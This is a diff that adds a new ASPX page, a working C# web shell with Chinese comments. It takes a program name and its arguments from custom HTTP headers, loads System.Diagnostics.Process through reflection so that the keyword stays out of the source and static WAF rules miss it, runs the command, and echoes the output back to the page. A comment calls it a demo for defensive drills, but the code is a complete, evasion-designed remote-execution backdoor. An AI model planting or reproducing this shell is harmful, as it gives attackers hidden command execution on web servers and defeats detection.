@@ -1,0 +1,49 @@
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Reflection" %>
+<script runat="server">
+    // 用于演示的轻量级回显逻辑，可规避传统 WAF 的静态正则匹配
+    void Page_Load(object sender, EventArgs e)
+    {
+        try
+        {
+            // 1. 从不同的非显式参数中获取混淆后的指令（例如通过 Headers 或 Cookie）
+            string p1 = Request.Headers["X-Data-P1"]; // 传入加密或混淆后的命令，如 "cmd.exe"
+            string p2 = Request.Headers["X-Data-P2"]; // 传入参数，如 "/c whoami"
+
+            if (!string.IsNullOrEmpty(p1) && !string.IsNullOrEmpty(p2))
+            {
+                // 2. 利用反射动态加载 System.dll 中的 Diagnostics 命名空间
+                // 规避直接在代码中出现 System.Diagnostics.Process 关键字
+                Assembly sys = Assembly.Load("System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
+                Type procType = sys.GetType("System.Diagnostics.Process");
+                
+                // 3. 动态创建 Process 实例并设置启动参数
+                object proc = Activator.CreateInstance(procType);
+                
+                object startInfo = procType.GetProperty("StartInfo").GetValue(proc, null);
+                Type siType = startInfo.GetType();
+                
+                // 设置 FileName 和 Arguments
+                siType.GetProperty("FileName").SetValue(startInfo, p1, null);
+                siType.GetProperty("Arguments").SetValue(startInfo, p2, null);
+                siType.GetProperty("RedirectStandardOutput").SetValue(startInfo, true, null);
+                siType.GetProperty("UseShellExecute").SetValue(startInfo, false, null);
+
+                // 4. 调用 Start 方法执行
+                procType.GetMethod("Start", new Type[]{}).Invoke(proc, null);
+
+                // 5. 动态读取回显结果
+                object reader = procType.GetProperty("StandardOutput").GetValue(proc, null);
+                string result = (string)reader.GetType().GetMethod("ReadToEnd").Invoke(reader, null);
+
+                // 6. 输出结果回显到页面
+                Response.Write("<pre>" + Server.HtmlEncode(result) + "</pre>");
+            }
+        }
+        catch (Exception ex)
+        {
+            // 防御演练中建议捕获异常以供调试
+            // Response.Write(ex.Message);
+        }
+    }
+</script>
